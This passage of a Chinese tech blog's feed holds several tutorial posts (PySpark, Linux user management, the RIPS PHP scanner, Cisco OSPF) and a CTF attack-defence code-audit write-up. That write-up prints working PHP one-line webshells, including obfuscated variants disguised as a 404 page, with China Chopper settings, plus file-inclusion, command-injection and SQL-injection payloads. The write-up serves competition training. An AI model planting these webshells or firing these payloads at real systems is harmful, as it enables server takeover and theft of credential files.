class="line">group by Experience  </span><br><span class="line">&quot;&quot;&quot;)  </span><br><span class="line">Company_Type_df.show()</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfOTE2NjY2OTg4XzE1NzA1OTM4NjgwNDIvMA?x-oss-process=image/format,png" alt></p><p>使用PySpark SQL统计公司规模及数量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">select distinct  </span><br><span class="line">z.Company_Size,count(*) counts   </span><br><span class="line">from   </span><br><span class="line">zhilian_table z   </span><br><span class="line">group by Company_Size  </span><br><span class="line">&quot;&quot;&quot;)  </span><br><span class="line">Company_Type_df.show()</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfOTE2NjY2OTg4XzE1NzA1OTM5NDY4ODAvMA?x-oss-process=image/format,png" alt></p><p>以上我们便简单实现了PySpark RDD、DataFrame、PySpark SQL三种处理数据的方式</p><p>数据集可以私聊我领取</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;使用PySpark对智联数据进行分析&quot;&gt;&lt;a href=&quot;#使用PySpark对智联数据进行分析&quot; class=&quot;headerlink&quot; title=&quot;使用PySpark对智联数据进行分析&quot;&gt;&lt;/a&gt;使用PySpark对智联数据进行分析&lt;/h2&gt;&lt;h3 id=&quot;S
      
    
    </summary>
    
      <category term="Hadoop" scheme="https://plutoacharon.github.io/categories/Hadoop/"/>
    
    
      <category term="PySpark" scheme="https://plutoacharon.github.io/tags/PySpark/"/>
    
  </entry>
  
  <entry>
    <title>CTF 河北大赛AWD简单的代码审计</title>
    <link href="https://plutoacharon.github.io/2019/10/10/CTF-%E6%B2%B3%E5%8C%97%E5%A4%A7%E8%B5%9BAWD%E7%AE%80%E5%8D%95%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <id>https://plutoacharon.github.io/2019/10/10/CTF-河北大赛AWD简单的代码审计/</id>
    <published>2019-10-10T14:10:25.000Z</published>
    <updated>2019-10-10T14:10:50.506Z</updated>
    
    <content type="html"><![CDATA[<p>今天先把去年的AWD代码审计一下,以后有时间就把今年的AWD代码审计写一下</p><h2 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">include</span> <span class="string">'header.php'</span>;</span><br><span class="line">@<span class="keyword">eval</span>($_REQUEST[<span class="string">'aa'</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'eval'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfMjAyMTA3NDMyMV8xNTcwNTE5MTk1NDkzLzA?x-oss-process=image/format,png" alt></p><p>首先打开index.php,一目了然,可以看到头文件有一句话木马,密码是<code>aa</code></p><p>这里使用中国菜刀可以直接连上一句话木马,进入服务器</p><h3 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h3><h4 id="了解一句话脚本的工作原理"><a href="#了解一句话脚本的工作原理" class="headerlink" title="了解一句话脚本的工作原理"></a>了解一句话脚本的工作原理</h4><h6 id="一句话脚本的工作原理："><a href="#一句话脚本的工作原理：" class="headerlink" title="一句话脚本的工作原理："></a>一句话脚本的工作原理：</h6><p>一句话恶意脚本分析服务端与客户端。(此处以php脚本语言简述原理）</p><p>一句话恶意脚本服务端就是我们要用来插入到php文件中的asp语句，（不仅仅是以php为后缀的数据库文件），该语句将回为触发，接收入侵者通过客户端提交的数据，执行并完成相应的操作，服务端的代码内容为@eval($_REQUEST[‘aa’]); 其中aa可以自己修改</p><p>一句话恶意脚本客户端（即为中国菜刀主程序）用来向服务端提交控制数据的，提交的数据通过服务端构成完整的php功能语句并执行.</p><blockquote><p>中国菜刀的请求方式为post。</p></blockquote><h4 id="一句话脚本的变形"><a href="#一句话脚本的变形" class="headerlink" title="一句话脚本的变形"></a>一句话脚本的变形</h4><h5 id="案例1"><a href="#案例1" class="headerlink" title="案例1"></a>案例1</h5><p>加密类变形</p><p>php一句话恶意脚本带404页面,带MD5加密,可浏览器POST任意php代码执行. 代码如下:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"404 Not Found!&lt;/br&gt;"</span>; error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'com'</span>]) &amp;&amp; md5($_POST[<span class="string">'com'</span>]) == <span class="string">'791dc312b38016ef998c1c146104cd5a'</span> &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'content'</span>])) $content = strtr($_POST[<span class="string">'content'</span>], <span class="string">'-_,'</span>, <span class="string">'+/='</span>);<span class="keyword">eval</span>(base64_decode($content));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"We're sorry but the page your are looking for is Not Found..."</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在菜刀里写<code>http://xx.xx.xx.xx/test.php</code> </p><p>密码:<code>page</code></p><p>菜刀配置填：</p><p><code>＜O＞com=settoken&amp;content=ZXZhbCgkX1BPU1RbJ3BhZ2UnXSk7＜/O＞</code></p><h5 id="案例2-变量拼接类变形"><a href="#案例2-变量拼接类变形" class="headerlink" title="案例2 变量拼接类变形"></a>案例2 变量拼接类变形</h5><p>webshell的代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$sF=<span class="string">"PCT4BA6ODSE_"</span>;$s21=strtolower($sF[<span class="number">4</span>].$sF[<span class="number">5</span>].$sF[<span class="number">9</span>].$sF[<span class="number">10</span>].$sF[<span class="number">6</span>].$sF[<span class="number">3</span>].$sF[<span class="number">11</span>].$sF[<span class="number">8</span>].$sF[<span class="number">10</span>].$sF[<span class="number">1</span>].$sF[<span class="number">7</span>].$sF[<span class="number">8</span>].$sF[<span class="number">10</span>]);$s22=$&#123;strtoupper($sF[<span class="number">11</span>].$sF[<span class="number">0</span>].$sF[<span class="number">7</span>].$sF[<span class="number">9</span>].$sF[<span class="number">2</span>])&#125;[<span class="string">'n985de9'</span>];<span class="keyword">if</span>(<span class="keyword">isset</span>($s22))&#123;<span class="keyword">eval</span>($s21($s22));&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在菜刀里写<a href="http://xx.xx.xx.xx/test.php" target="_blank" rel="noopener">http://xx.xx.xx.xx/test.php</a></p><p>密码是:<code>0</code></p><p>菜刀配置填：</p><p><code>＜O＞n985de9=QGV2YWwoJF9QT1NUWzBdKTs=＜/O＞</code></p><h5 id="案例3-加密拼接类变形"><a href="#案例3-加密拼接类变形" class="headerlink" title="案例3 加密拼接类变形"></a>案例3 加密拼接类变形</h5><p>webshell的代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $_uU=chr(<span class="number">99</span>).chr(<span class="number">104</span>).chr(<span class="number">114</span>);$_cC=$_uU(<span class="number">101</span>).$_uU(<span class="number">118</span>).$_uU(<span class="number">97</span>).$_uU(<span class="number">108</span>).$_uU(<span class="number">40</span>).$_uU(<span class="number">36</span>).$_uU(<span class="number">95</span>).$_uU(<span class="number">80</span>).$_uU(<span class="number">79</span>).$_uU(<span class="number">83</span>).$_uU(<span class="number">84</span>).$_uU(<span class="number">91</span>).$_uU(<span class="number">49</span>).$_uU(<span class="number">93</span>).$_uU(<span class="number">41</span>).$_uU(<span class="number">59</span>);$_fF=$_uU(<span class="number">99</span>).$_uU(<span class="number">114</span>).$_uU(<span class="number">101</span>).$_uU(<span class="number">97</span>).$_uU(<span class="number">116</span>).$_uU(<span class="number">101</span>).$_uU(<span class="number">95</span>).$_uU(<span class="number">102</span>).$_uU(<span class="number">117</span>).$_uU(<span class="number">110</span>).$_uU(<span class="number">99</span>).$_uU(<span class="number">116</span>).$_uU(<span class="number">105</span>).$_uU(<span class="number">111</span>).$_uU(<span class="number">110</span>);$_=$_fF(<span class="string">""</span>,$_cC);@$_();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在菜刀里写<a href="http://xx.xx.xx.xx/test.php" target="_blank" rel="noopener">http://xx.xx.xx.xx/test.php</a></p><p>连接密码：<code>1</code></p><h2 id="about-php"><a href="#about-php" class="headerlink" title="about.php"></a>about.php</h2><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfMjAyMTA3NDMyMV8xNTcwNTE5Mzg0OTgyLzA?x-oss-process=image/format,png" alt></p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfMTk5Mzg5MDMxXzE1NzA1MTk0MzQ5MDYvMA?x-oss-process=image/format,png" alt></p><p>可以看到这里打开了 <code>allow_url_include</code> 并且代码中有明显的<code>文件包含漏洞</code></p><p>payload为<code>?file=/etc/passwd</code></p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfMjAyMTA3NDMyMV8xNTcwNTE5NjgwOTc3LzA?x-oss-process=image/format,png" alt></p><p>具体的文件包含漏洞可以查看<a href="https://www.k0rz3n.com/2018/11/20/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8B%20PHP%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/#5-proc-self-environ" target="_blank" rel="noopener">这篇文章</a></p><h2 id="services-php"><a href="#services-php" class="headerlink" title="services.php"></a>services.php</h2><p>这里我们点击第三个选项<code>服务</code>,点击以后页面正常 这里我们去查看一下它的源码</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfNzM2NjcwMDMyXzE1NzA1MTk5Mzg4MzIvMA?x-oss-process=image/format,png" alt></p><p>发现有异常,这里是一个简单的命令执行漏洞</p><p>payload:?shell=ls</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfMTk5Mzg5MDMxXzE1NzA1MjAzMTUzODkvMA?x-oss-process=image/format,png" alt></p><h2 id="contact-php"><a href="#contact-php" class="headerlink" title="contact.php"></a>contact.php</h2><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfMTk5Mzg5MDMxXzE1NzA1MjAzNjM3NDQvMA?x-oss-process=image/format,png" alt></p><p>查看源码:</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfMjAyMTA3NDMyMV8xNTcwNTIwNDM2MzI1LzA?x-oss-process=image/format,png" alt></p><p>可以发现这里也是一个文件包含漏洞,不过相比上面那个有些复杂</p><p>payload:?path=/etc/passwd</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfNzk2NDgwMzM2XzE1NzA1MjA1NDg0NjQvMA?x-oss-process=image/format,png" alt></p><p>爆出passwd文件</p><h2 id="footer-php"><a href="#footer-php" class="headerlink" title="footer.php"></a>footer.php</h2><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfNzM2NjcwMDMyXzE1NzA1MjA1ODIyNjUvMA?x-oss-process=image/format,png" alt></p><p>返回主页 发现页面底端有异常</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfMTk5Mzg5MDMxXzE1NzA1MjA2NDY0OTQvMA?x-oss-process=image/format,png" alt></p><p>这里有简单的命令执行漏洞 </p><p>注释即可</p><h2 id="admin页面"><a href="#admin页面" class="headerlink" title="admin页面"></a>admin页面</h2><p>在登陆界面</p><h3 id="login-php"><a href="#login-php" class="headerlink" title="login.php"></a>login.php</h3><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfMTQwOTA3NTY4M18xNTcwNTM1NjE0MDE3LzA?x-oss-process=image/format,png" alt></p><p>简单的sql注入</p><p>payload:<code>admin &#39; #</code></p><h2 id="header-php"><a href="#header-php" class="headerlink" title="header.php"></a>header.php</h2><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfMTQwOTA3NTY4M18xNTcwNTM1NzU1ODAyLzA?x-oss-process=image/format,png" alt></p><p>这里是一个php命令执行漏洞</p><p>payload: <code>?p=cat /flag.txt</code></p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfMTIxODk5OTkwNl8xNTcwNTM2OTk2MjU4LzA?x-oss-process=image/format,png" alt></p><p>好了,代码就差不多就审计到这里了,一些简单的后门漏洞等用D盾或审计工具可以找出来,要想提高自己的话尽量花点时间,自主审计</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;今天先把去年的AWD代码审计一下,以后有时间就把今年的AWD代码审计写一下&lt;/p&gt;
&lt;h2 id=&quot;index-php&quot;&gt;&lt;a href=&quot;#index-php&quot; class=&quot;headerlink&quot; title=&quot;index.php&quot;&gt;&lt;/a&gt;index.php&lt;/h2&gt;
      
    
    </summary>
    
      <category term="CTF" scheme="https://plutoacharon.github.io/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://plutoacharon.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Liunx 管理用户、组及权限</title>
    <link href="https://plutoacharon.github.io/2019/10/10/Liunx-%E7%AE%A1%E7%90%86%E7%94%A8%E6%88%B7%E3%80%81%E7%BB%84%E5%8F%8A%E6%9D%83%E9%99%90/"/>
    <id>https://plutoacharon.github.io/2019/10/10/Liunx-管理用户、组及权限/</id>
    <published>2019-10-10T14:08:40.000Z</published>
    <updated>2019-10-10T14:08:57.219Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一-使用命令创建用户并赋予访问权限"><a href="#一-使用命令创建用户并赋予访问权限" class="headerlink" title="一 使用命令创建用户并赋予访问权限"></a>一 使用命令创建用户并赋予访问权限</h2><h5 id="命令列表："><a href="#命令列表：" class="headerlink" title="命令列表："></a>命令列表：</h5><p>命令|描述<br>|–|–|<br>Useradd|    添加用户<br>Userdel|    删除用户<br>Groupadd    |添加组<br>Passwd|    更改用户密码<br>Chmod|    更改目录权限<br>Chown|    更改目录所有者</p><ol><li><p>使用<code>groupadd</code>命令创建用户组user_group<br><img src="https://img-blog.csdnimg.cn/20191008190505804.png" alt="在这里插入图片描述"></p></li><li><p>使用<code>useradd</code>命令创建用户user1，要求所属组为user_group、用户主目录为/user1<br><img src="https://img-blog.csdnimg.cn/20191008190516407.png" alt="在这里插入图片描述"></p></li><li><p>使用<code>useradd</code>命令创建用户user2，要求所属组为user_group、用户主目录为/home/user2</p><p><img src="https://img-blog.csdnimg.cn/20191008190525927.png" alt="在这里插入图片描述"></p></li><li><p>修改两个用户的登录密码为123，使用两个用户登录系统<br><img src="https://img-blog.csdnimg.cn/20191008190535990.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></li><li><p>建立/share目录，设置属主为root，属组为user_group</p></li></ol><p><img src="https://img-blog.csdnimg.cn/20191008190545842.png" alt="在这里插入图片描述"></p><ol start="6"><li>设置/share目录权限为，属主读写执行，属组读写执行，其他人可读</li></ol><p><img src="https://img-blog.csdnimg.cn/20191008190557718.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="二-通过编辑配置文件创建用户"><a href="#二-通过编辑配置文件创建用户" class="headerlink" title="二 通过编辑配置文件创建用户"></a>二 通过编辑配置文件创建用户</h2><ol><li>编辑passwd文件增加用户user3<br><img src="https://img-blog.csdnimg.cn/20191008190607898.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li><li>编辑shadow文件设置用户user3密码为123</li></ol><p><img src="https://img-blog.csdnimg.cn/20191008190616776.png" alt="在这里插入图片描述"></p><ol start="3"><li><p>编辑group文件改变用户所属组为user_group<br><img src="https://img-blog.csdnimg.cn/20191008190637764.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></li><li><p>拷贝查看用户环境配置文件(/etc/skel)并设置权限</p><p><img src="https://img-blog.csdnimg.cn/20191008190646511.png" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/2019100819065393.png" alt="在这里插入图片描述"></p></li><li>使用user3用户登录</li></ol><p><img src="https://img-blog.csdnimg.cn/2019100819065928.png" alt="在这里插入图片描述"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;一-使用命令创建用户并赋予访问权限&quot;&gt;&lt;a href=&quot;#一-使用命令创建用户并赋予访问权限&quot; class=&quot;headerlink&quot; title=&quot;一 使用命令创建用户并赋予访问权限&quot;&gt;&lt;/a&gt;一 使用命令创建用户并赋予访问权限&lt;/h2&gt;&lt;h5 id=&quot;命令列表：
      
    
    </summary>
    
      <category term="Liunx" scheme="https://plutoacharon.github.io/categories/Liunx/"/>
    
    
      <category term="Liunx" scheme="https://plutoacharon.github.io/tags/Liunx/"/>
    
  </entry>
  
  <entry>
    <title>PHP代码审计工具Rips的使用</title>
    <link href="https://plutoacharon.github.io/2019/10/10/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B7%A5%E5%85%B7Rips%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <id>https://plutoacharon.github.io/2019/10/10/PHP代码审计工具Rips的使用/</id>
    <published>2019-10-10T14:06:28.000Z</published>
    <updated>2019-10-10T14:07:32.972Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Rips"><a href="#Rips" class="headerlink" title="Rips"></a>Rips</h2><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfMTIzMTgzMjkxNF8xNTY5OTIyMjAzOTM4LzA?x-oss-process=image/format,png" alt></p><h3 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h3><p>最近在准备CTF攻防比赛时发现了一个很好的代码审计工具，接下来就给大家介绍此工具的使用</p><p>在安全工作中，代码审计是很重要的一项技能。在面对大规模的代码时，<br>使用自动化工具辅助人工漏洞挖掘，可以显著提高审计工作的效率。学会利用自动化代码审计工具，是每一个代码审计人员必备的能力。</p><p>它使用了静态分析技术，能够自动化地挖掘PHP源代码潜在的安全漏洞如XSS ，sql注入，敏感信息泄漏，文件包含等常见漏洞；也可以采用正则方式扫描代码发现漏洞；还能够采用自定义的语法扫描代码发现问题。渗透测试人员可以直接容易的审阅分析结果，而不用审阅整个程序代码。当然，最后去校验结果必须是我们自己去做的</p><p>RIPS 能够检测 XSS, SQL 注入, 文件泄露, Header Injection 漏洞等等</p><h3 id="0x01-安装"><a href="#0x01-安装" class="headerlink" title="0x01 安装"></a>0x01 安装</h3><p>rips官网：<a href="http://rips-scanner.sourceforge.net/" target="_blank" rel="noopener">http://rips-scanner.sourceforge.net/</a></p><p>当然也可以私聊我要汉化版的Rips</p><p>下载完之后将该压缩包解压到本地网站的根目录下，然后在浏览器 <code>localhost/Rips(你解压的文件名字)/</code>就可以进去了</p><h3 id="0x02-界面介绍"><a href="#0x02-界面介绍" class="headerlink" title="0x02 界面介绍"></a>0x02 界面介绍</h3><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfOTc2NDQ0MTY2XzE1Njk5MjcyMTUxOTAvMA?x-oss-process=image/format,png" alt><br>Rips 主界面</p><ul><li>subdirs：如果勾选上这个选项，会扫描所有子目录，否则只扫描一级目录，缺省为勾选。</li><li>verbosity level：选择扫描结果的详细程度，缺省为1(建议就使用1)。</li><li>vuln type：选择需要扫描的漏洞类型。支持命令注入、代码执行、SQL注入等十余种漏洞类型，缺省为全部扫描。</li><li>code style：选择扫描结果的显示风格（支持9种语法高亮）。</li><li>/regex/：使用正则表达式过滤结果。</li><li>path/file： 要扫描的目录。</li><li>scan： 开始扫描。</li></ul><h3 id="0x03-使用"><a href="#0x03-使用" class="headerlink" title="0x03 使用"></a>0x03 使用</h3><p>在path/file中输入扫描目录， 点击scan：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfNTIyNTc0MTEzXzE1Njk5MjczNjc2NzMvMA?x-oss-process=image/format,png" alt></p><p>可以看到，RIPS的功能还是很强大的，将目录中所有的漏洞文件找出</p><p>点击左上角的按钮可以查看代码的详细情况</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfOTc2NDQ0MTY2XzE1Njk5Mjc2MjY2NzAvMA?x-oss-process=image/format,png" alt></p><p>左下角的问号是<code>解释</code>，它会详细的解释这是什么类型的漏洞，并且有漏洞补丁方案</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfMTQwOTA3NTY4M18xNTY5OTI3ODcxMTYwLzA?x-oss-process=image/format,png" alt></p><p>右下角的红色按钮，可以根据漏洞生成漏洞利用代码</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfOTc2NDQ0MTY2XzE1Njk5Mjc5MDgwMDMvMA?x-oss-process=image/format,png" alt></p><h3 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h3><p>到这里我们可以看到该工具非常强大，但工具到头来只是帮助提高效率，它们从来不是可以提高基础知识与技术的捷径，真正的审计还得靠我们一步一步的学习与经验的积累而来的。</p><h2 id="参考网站："><a href="#参考网站：" class="headerlink" title="参考网站："></a>参考网站：</h2><p><a href="https://uuzdaisuki.com/2018/05/11/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B7%A5%E5%85%B7RIPS/" target="_blank" rel="noopener">https://uuzdaisuki.com/2018/05/11/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B7%A5%E5%85%B7RIPS/</a></p><p><a href="https://phperzh.com/articles/3505" target="_blank" rel="noopener">https://phperzh.com/articles/3505</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Rips&quot;&gt;&lt;a href=&quot;#Rips&quot; class=&quot;headerlink&quot; title=&quot;Rips&quot;&gt;&lt;/a&gt;Rips&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaW
      
    
    </summary>
    
      <category term="CTF" scheme="https://plutoacharon.github.io/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://plutoacharon.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>思科模拟器 使用IOS配置启用ospf路由</title>
    <link href="https://plutoacharon.github.io/2019/10/06/%E6%80%9D%E7%A7%91%E6%A8%A1%E6%8B%9F%E5%99%A8-%E4%BD%BF%E7%94%A8IOS%E9%85%8D%E7%BD%AE%E5%90%AF%E7%94%A8ospf%E8%B7%AF%E7%94%B1/"/>
    <id>https://plutoacharon.github.io/2019/10/06/思科模拟器-使用IOS配置启用ospf路由/</id>
    <published>2019-10-06T13:04:17.000Z</published>
    <updated>2019-10-06T13:09:45.234Z</updated>
    
    <content type="html"><![CDATA[<h2 id="网络拓扑如下"><a href="#网络拓扑如下" class="headerlink" title="网络拓扑如下"></a>网络拓扑如下</h2><p><img src="https://img-blog.csdnimg.cn/20191006185700373.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="IP地址分配表"><a href="#IP地址分配表" class="headerlink" title="IP地址分配表"></a>IP地址分配表</h3><table><thead><tr><th>设备名</th><th>端口/接口</th><th>IP地址</th><th>掩码长度</th><th>网关</th></tr></thead><tbody><tr><td>PC0</td><td>Fa0</td><td>172.16.1.2</td><td>24</td><td>172.16.1.1</td></tr><tr><td>PC1</td><td>Fa0</td><td>7.0.0.2</td><td>30</td><td>7.0.0.1</td></tr><tr><td>Inter-Srv</td><td>Fa0</td><td>6.0.0.2</td><td>8</td><td>6.0.0.1</td></tr><tr><td>FireWall</td><td>Fa0/0</td><td>172.16.1.1</td><td>24</td></tr><tr><td>FireWall</td><td>Gig0/3/0</td><td>2.0.0.2</td><td>30</td></tr><tr><td>ISP1</td><td>Fa0/0</td><td>5.0.0.1</td><td>8</td></tr><tr><td>ISP1</td><td>Fa0/1</td><td>3.0.0.1</td><td>8</td></tr><tr><td>ISP1</td><td>Gig0/3/0</td><td>2.0.0.0</td><td>30</td></tr><tr><td>ISP2</td><td>Fa0/0</td><td>5.0.0.2</td><td>8</td></tr><tr><td>ISP2</td><td>Fa0/1</td><td>4.0.0.2</td><td>8</td></tr><tr><td>ISP2</td><td>Fa1/0</td><td>7.0.0.1</td><td>30</td></tr><tr><td>ISP3</td><td>Fa0/0</td><td>3.0.0.2</td><td>8</td></tr><tr><td>ISP3</td><td>Fa0/1</td><td>4.0.0.1</td><td>8</td></tr><tr><td>ISP3</td><td>Fa1/0</td><td>6.0.0.1</td><td>8</td></tr></tbody></table><h3 id="静态路由表"><a href="#静态路由表" class="headerlink" title="静态路由表"></a>静态路由表</h3><h4 id="FireWall"><a href="#FireWall" class="headerlink" title="FireWall"></a>FireWall</h4><table><thead><tr><th>目的网络</th><th>掩码</th><th>下一跳地址</th><th>说明</th></tr></thead><tbody><tr><td>6.0.0.0</td><td>255.0.0.0</td><td>2.0.0.1</td></tr><tr><td>7.0.0.0</td><td>255.255.255.252</td><td>2.0.0.1</td></tr></tbody></table><h4 id="ISP1"><a href="#ISP1" class="headerlink" title="ISP1"></a>ISP1</h4><table><thead><tr><th>目的网络</th><th>掩码</th><th>下一跳地址</th><th>说明</th></tr></thead><tbody><tr><td>6.0.0.0</td><td>255.0.0.0</td><td>3.0.0.2</td></tr><tr><td>7.0.0.0</td><td>255.0.0.0</td><td>5.0.0.2</td></tr><tr><td>172.16.1.0</td><td>255.255.255.0</td><td>2.0.0.2</td></tr></tbody></table><h4 id="ISP2"><a href="#ISP2" class="headerlink" title="ISP2"></a>ISP2</h4><table><thead><tr><th>目的网络</th><th>掩码</th><th>下一跳地址</th><th>说明</th></tr></thead><tbody><tr><td>172.16.1.0</td><td>255.255.255.0</td><td>5.0.0.1</td></tr><tr><td>6.0.0.0</td><td>55.0.0.0</td><td>6.0.0.1</td></tr></tbody></table><h4 id="ISP3"><a href="#ISP3" class="headerlink" title="ISP3"></a>ISP3</h4><table><thead><tr><th>目的网络</th><th>掩码</th><th>下一跳地址</th><th>说明</th></tr></thead><tbody><tr><td>7.0.0.0</td><td>255.255.255.252</td><td>4.0.0.2</td></tr><tr><td>172.16.1.0</td><td>255.255.255.0</td><td>3.0.0.1</td></tr></tbody></table><p><strong>删除ISP1、ISP2、ISP3、FireWall上的静态路由表</strong><br>例如:<br><img src="https://img-blog.csdnimg.cn/20191006185721994.png" alt="在这里插入图片描述"><br><img 